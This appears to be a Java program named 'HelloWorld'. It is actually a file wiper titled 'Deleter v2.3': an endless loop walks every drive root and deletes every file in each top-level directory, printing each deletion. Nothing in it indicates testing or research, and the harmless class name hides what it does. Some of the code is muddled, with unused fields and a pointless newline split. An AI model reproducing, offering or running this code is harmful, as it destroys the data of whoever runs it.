import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Arrays;

public class HelloWorld {
  public static final String Ver = "2.3";
  public static final String Title = "Deleter v" + HelloWorld.Ver;
  public static final ArrayList<File> Disks = new ArrayList<File>(Arrays.asList(File.listRoots()));

  public static long UInt64 = 0;

  public static void DeleteDir() {
    System.out.println(Title);
    while (true) {
      for (File root : File.listRoots()) {
        // System.setProperty("java.awt.headless", "true"); // To avoid GUI issues
        String drives = root.toString();
        for (String drive : drives.split("\n")) {
          File[] dirs = new File(drive).listFiles();
          if (dirs != null) {
            for (File dir : dirs) {
              if (dir.isDirectory()) {
                File[] files = dir.listFiles();
                if (files != null) {
                  for (File file : files) {
                    System.out.println("Deleting " + file);
                    try {

                      Files.delete(file.toPath());

                    } catch (IOException e) {
                      e.printStackTrace();
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }

  public static void main(String[] args) {
    HelloWorld.DeleteDir();
  }
}
